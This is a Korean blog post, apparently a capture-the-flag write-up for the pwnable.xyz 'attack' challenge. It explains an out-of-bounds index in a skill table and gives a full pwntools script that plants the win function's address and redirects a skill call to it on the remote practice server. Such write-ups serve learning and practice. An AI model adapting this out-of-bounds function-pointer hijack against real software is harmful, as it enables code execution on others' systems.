---
title: "[pwnable.xyz]attack"
date: 2020-5-1
ctf: Pwnable.xyz
layout: post
---

바이너리가 좀 크지만 인풋 받는곳에서 취약점 터지는거 알면 쉽게 풀 수 있다. level1을 만들고 win주소를 player.Equip.Name에 박아놓고 level2를 만들고 skill change할 때 SkillTable에서 oob가 터져서 바꿀 수 있다 그리고 3번 메뉴로 나가서 전투에서 스킬 사용하면 win함수가 호출된다.

> exploit.py

```python
from pwn import *

e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30020)
win = e.symbols['win']
level = 0
SkillTable = 0x00000000006046E0
player_equip = 0x0000000000604288 + 0xd0 # player.Equip.Name

get = ['Which skill do you want to use : ','Do you want to change your equip (y/n)? : '
,'Do you want to change the type of your skills (y/n)? : ','Which skill do you want to change (3 to exit): ']
# log.info(a[-1])
while True:
	sleep(1)
	a=p.read().split('\n')[-1]
	log.info(a)
	if get[0] == a:
		p.sendline('1')
		p.sendlineafter('Which target you want to use that skill on :','0')
	elif get[1] == a:
		p.sendline('y')
		p.sendlineafter('Name for your equip: ',p64(win))
	elif get[2] == a:
		p.sendline('y')
		p.sendlineafter('Which skill do you want to change (3 to exit): ','1')
		p.sendlineafter('What type of skill is this (0: Heal, 1: Attack): ',str((player_equip-SkillTable)/8))
	elif get[3] == a:
		p.sendline('3')
		p.sendlineafter('Which skill do you want to use : ','1')
		p.sendlineafter('Which target you want to use that skill on :','0')
		p.interactive()

p.interactive()
```

